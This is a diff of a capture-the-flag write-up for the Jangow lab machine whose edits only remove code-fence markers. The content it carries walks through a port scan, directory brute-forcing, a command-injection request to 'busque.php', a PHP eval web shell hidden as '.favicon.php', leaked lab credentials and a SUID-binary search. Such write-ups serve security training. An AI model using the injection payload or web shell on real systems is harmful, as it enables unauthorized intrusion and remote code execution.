@@ -6,14 +6,14 @@ title: Jangow box writeup
 
 
 ## Credentials for debugging network connectivity
-```
+
  username = "jangow01" 
  password = "abygurl69"
-```
+
 
 
 ## Ports open
-```
+
 PORT   STATE SERVICE REASON  VERSION
 21/tcp open  ftp     syn-ack vsftpd 3.0.3
 80/tcp open  http    syn-ack Apache httpd 2.4.18
@@ -27,10 +27,10 @@ PORT   STATE SERVICE REASON  VERSION
 |_http-title: Index of /
 Service Info: Host: 127.0.0.1; OS: Unix
 
-```
+
 
 ## Bruteforcing directories
-```
+
 python3.7 dirsearch.py -u http://192.168.50.52 -r -e php,txt -f -x 400,403,404
 
   _|. _ _  _  _  _ _|_    v0.4.2
@@ -72,10 +72,10 @@ Task Completed
 
 
 
-```
+
 
 Backup file 
-```
+
 $servername = "localhost";
 $database = "jangow01";
 $username = "jangow01";
@@ -88,20 +88,20 @@ if (!$conn) {
 }
 echo "Connected successfully";
 mysqli_close($conn);
-```
+
 
 
 ## Payload
-```
+
 The following page has a command injection vulnerability in the buscar parameter
 
 http://192.168.50.52/site/busque.php?buscar=
 
 curl -X GET "http://192.168.50.52/site/busque.php?buscar=echo%20\"hacker\"%20>%20hacker.txt"
-```
+
 
 ### Uploading a better shell
-```
+
 <?php if(isset(\$_POST['cmd'])){print_r(@eval(\$_POST['cmd']));} ?>
 
 Checking whether the machine has base64 
@@ -132,10 +132,10 @@ Webshell : http://192.168.50.52/site/.favicon.php
 www-data@192.168.50.52 > 
 
 
-```
+
 
 ### Searching for files in the /var/www/html/ directory
-```
+
 /var/www/html
 /var/www/html/.backup
 /var/www/html/site
@@ -157,10 +157,10 @@ www-data@192.168.50.52 >
 /var/www/html/site/busque.php
 /var/www/html/site/css
 /var/www/html/site/css/styles.css
-```
+
 
 ### Searching for files in the home folder
-```
+
 /home
 /home/jangow01
 /home/jangow01/user.txt
@@ -171,16 +171,16 @@ www-data@192.168.50.52 >
 /home/jangow01/.profile
 /home/jangow01/.bashrc
 /home/jangow01/.sudo_as_admin_successful
-```
+
 
 ### Reading user.txt
-```
+
 d41d8cd98f00b204e9800998ecf8427e
-```
+
 
 ### Finding suid binaries
 find / -perm -u=s -type f 2>/dev/null
-```
+
 /usr/lib/dbus-1.0/dbus-daemon-launch-helper
 /usr/lib/eject/dmcrypt-get-device
 /usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
@@ -205,5 +205,5 @@ find / -perm -u=s -type f 2>/dev/null
 /bin/ping6
 /bin/mount
 
-```
+
 
